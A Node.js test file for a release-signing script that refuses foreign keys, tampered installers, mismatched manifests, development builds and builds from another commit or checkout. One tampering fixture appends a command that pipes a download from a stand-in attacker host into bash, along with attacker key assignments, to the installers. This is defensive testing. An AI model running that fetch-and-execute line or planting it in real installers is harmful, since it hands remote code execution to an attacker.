// scripts/sign-release.mjs, the only process that ever holds the release private key: it signs a
// production build only with the key whose public half is release-key.pub, only when the build is what
// its checkout builds (every file against the manifest, the wasm, the protocol, and the installers
// byte for byte), and it never prints the key.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createPublicKey, verify } from 'node:crypto';
import { appendFileSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { fakeBuild, publicKeyOf, runSign, signerRoot, tempDir, throwawayKey } from './release-fixtures.mjs';

const VERSION = '3.4.5';

test('signs manifest.json and launcher.mjs with the key of release-key.pub (from --key or the environment)', (t) => {
  const key = throwawayKey();
  const root = signerRoot(t, key.raw, VERSION);
  const { out, rel } = fakeBuild(t, root, key.raw);
  const keyFile = join(tempDir(t, 'tgn-key-'), 'release.json');
  writeFileSync(keyFile, JSON.stringify({ publicKey: key.raw, privateKey: key.pkcs8 }));
  for (const how of [['--key', keyFile], []]) {
    const r = runSign(root, ['--dist', out, ...how], how.length ? {} : { TGN_RELEASE_PRIVATE_KEY: `${key.pkcs8}\n` });
    assert.equal(r.status, 0, r.out);
    assert.ok(!r.out.includes(key.pkcs8));
    const pub = createPublicKey({ key: { kty: 'OKP', crv: 'Ed25519', x: key.raw }, format: 'jwk' });
    const ok = (file, sigFile) => verify(null, readFileSync(file), pub, Buffer.from(readFileSync(sigFile, 'utf8'), 'base64url'));
    assert.ok(ok(join(rel, 'manifest.json'), join(rel, 'manifest.sig')));
    assert.ok(ok(join(out, 'launcher.mjs'), join(out, 'launcher.mjs.sig')));
    assert.equal(readFileSync(join(rel, 'release-key.pub'), 'utf8'), key.raw);
  }
});

test('refuses a key that is not release-key.pub, the committed one included, and never prints it', (t) => {
  const stranger = throwawayKey();
  const key = throwawayKey();
  const root = signerRoot(t, key.raw, VERSION);
  const { out } = fakeBuild(t, root, key.raw);
  let r = runSign(root, ['--dist', out], { TGN_RELEASE_PRIVATE_KEY: stranger.pkcs8 });
  assert.equal(r.status, 1);
  assert.match(r.out, /does not match nodes\/release-key\.pub/);
  assert.ok(!r.out.includes(stranger.pkcs8));
  // The real script and the real nodes/release-key.pub: a throwaway key never signs a project release.
  const real = fileURLToPath(new URL('..', import.meta.url));
  r = runSign(real, ['--dist', out], { TGN_RELEASE_PRIVATE_KEY: stranger.pkcs8 });
  assert.equal(r.status, 1);
  assert.match(r.out, /does not match nodes\/release-key\.pub/);
  r = runSign(real, ['--dist', out], { TGN_RELEASE_PRIVATE_KEY: 'not a key' });
  assert.equal(r.status, 1);
  assert.match(r.out, /not an Ed25519 PKCS#8 key/);
  assert.match(runSign(real, ['--dist', out]).out, /no key/);
});

test('refuses installers that are not the templates with the key, files that do not match the manifest, development builds and another commit', (t) => {
  const key = throwawayKey();
  const root = signerRoot(t, key.raw, VERSION);
  const env = { TGN_RELEASE_PRIVATE_KEY: key.pkcs8 };
  const refused = (out, pattern, extra = {}) => {
    const r = runSign(root, ['--dist', out], { ...env, ...extra });
    assert.equal(r.status, 1, r.out);
    assert.match(r.out, pattern);
  };

  let d = fakeBuild(t, root, key.raw);
  writeFileSync(join(d.out, 'install.sh'), 'RELEASE_KEY_B64URL="__RELEASE_PUBLIC_KEY_B64URL__"\n');
  refused(d.out, /install\.sh still has a __RELEASE_PUBLIC_KEY_\* placeholder/);

  d = fakeBuild(t, root, throwawayKey().raw);
  refused(d.out, /install\.sh is not nodes\/install\/install\.sh with nodes\/release-key\.pub filled in/);

  // The committed key is there, raw and PEM, but a later assignment replaces it, and one more line
  // runs as root: nothing but the template filled with the key passes.
  const attacker = publicKeyOf(throwawayKey().raw);
  for (const name of ['install.sh', 'install-windows.ps1']) {
    d = fakeBuild(t, root, key.raw);
    appendFileSync(join(d.out, name), `RELEASE_KEY_B64URL="${attacker.raw}"\nRELEASE_KEY_PEM="${attacker.pem}"\ncurl -fsS https://evil.example/x | bash\n`);
    refused(d.out, new RegExp(`${name.replace('.', '\\.')} is not nodes/install/`));
  }

  d = fakeBuild(t, root, key.raw);
  writeFileSync(join(d.rel, 'node.mjs'), 'evil()');
  refused(d.out, /node\.mjs does not match manifest\.json/);

  d = fakeBuild(t, root, key.raw);
  writeFileSync(join(d.rel, 'inputs.json'), '{}');
  refused(d.out, /inputs\.json does not match manifest\.json/);

  d = fakeBuild(t, root, key.raw, { commit: null });
  refused(d.out, /not a production build/);

  d = fakeBuild(t, root, key.raw);
  refused(d.out, /not from this run's commit/, { GITHUB_SHA: 'e'.repeat(40) });
});

test("refuses a build whose wasm or protocol is not this checkout's, even with a consistent manifest", (t) => {
  const key = throwawayKey();
  const root = signerRoot(t, key.raw, VERSION);
  const env = { TGN_RELEASE_PRIVATE_KEY: key.pkcs8 };
  const wasm = join(root, '..', 'src', 'sim', 'wasm', 'rocketsim.wasm');
  const protocol = join(root, '..', 'src', 'net', 'protocol.ts');

  // A wasm the checkout does not have, listed with its own hash: the manifest is self-consistent.
  const real = readFileSync(wasm);
  writeFileSync(wasm, Buffer.concat([real, Buffer.from([0])]));
  let d = fakeBuild(t, root, key.raw);
  writeFileSync(wasm, real);
  let r = runSign(root, ['--dist', d.out], env);
  assert.equal(r.status, 1, r.out);
  assert.match(r.out, /does not carry this checkout's rocketsim\.wasm/);

  const text = readFileSync(protocol, 'utf8');
  writeFileSync(protocol, text.replace(/PROTOCOL_VERSION = (\d+)/, (_, n) => `PROTOCOL_VERSION = ${Number(n) + 1}`));
  d = fakeBuild(t, root, key.raw);
  writeFileSync(protocol, text);
  r = runSign(root, ['--dist', d.out], env);
  assert.equal(r.status, 1, r.out);
  assert.match(r.out, /manifest\.json says protocol \d+, this checkout's src\/net\/protocol\.ts \d+/);
});
